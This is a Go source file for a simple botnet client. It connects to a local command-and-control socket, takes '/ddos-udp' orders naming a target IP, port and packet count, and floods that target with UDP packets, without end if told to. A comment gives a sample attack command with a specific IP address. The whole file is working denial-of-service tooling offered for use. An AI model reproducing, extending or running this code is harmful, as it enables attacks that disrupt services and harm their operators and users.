package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

func CreateDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
	serverAddr, err := net.ResolveUDPAddr("udp", address+":"+port)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	return data, serverAddr
}

func sendUdp(data string, serverAddr *net.UDPAddr) {
	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
	defer conn.Close()

	_, err = conn.Write([]byte(data))

	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
}

func udpFlood(host string, port string, pkg_c int) {
	udpString := "<DDL>UDP-FLOOD<DDL>"
	data, serverAddr := CreateDatagramm(udpString, host, port)

	fmt.Print("\n[DOS] - Processing")
	fmt.Println(" - {")
	fmt.Println("  UDP pkg := ", udpString)
	fmt.Println("  addr := ", serverAddr)

	flag := true

	if pkg_c != -1 {
		for i := 0; i <= pkg_c; i++ {
			sendUdp(data, serverAddr)
		}
	} else {
		for flag {
			sendUdp(data, serverAddr)
		}
	}
	fmt.Print("} - ")
	fmt.Println("<DDL>UDP-FLOOD -- STOPED")

}
func getIpPortWC(str string) (string, string, int) {

	cmdList := strings.Split(str, " ")
	ip := cmdList[1]
	Spkg_c := strings.Split(str, "-c ")[1]
	pkg_c, _ := strconv.Atoi(Spkg_c)

	if len(cmdList) > 2 {
		port := cmdList[2]

		return ip, port, pkg_c
	}
	return "None", "None", 0
}
func getSourceParram(cmd string) (string, error) {
	paramsList := strings.Split(cmd, " ")

	return paramsList[0], nil
}

func status() {
	fmt.Println("Status - Working . . .")
}

// DDOS cmd -> DDOS 163.217.31.78 8888 64
func source(cmd string) {
	cmdParam, _ := getSourceParram(cmd)

	fmt.Println(cmd)

	switch cmdParam {
	case "/ddos-udp":
		ip, port, pkg_c := getIpPortWC(cmd)
		udpFlood(ip, port, pkg_c)

	}
}

func main() {
	fmt.Println("_<DDL>[BOT](START)_")

	conn, _ := net.Dial("tcp", "localhost:6666")
	buffer := make([]byte, 1024)

	for {
		n, err := conn.Read(buffer)
		req := string(buffer[:n])

		if err != nil {
			time.Sleep(1)
		} else {
			source(req)
		}
	}
}
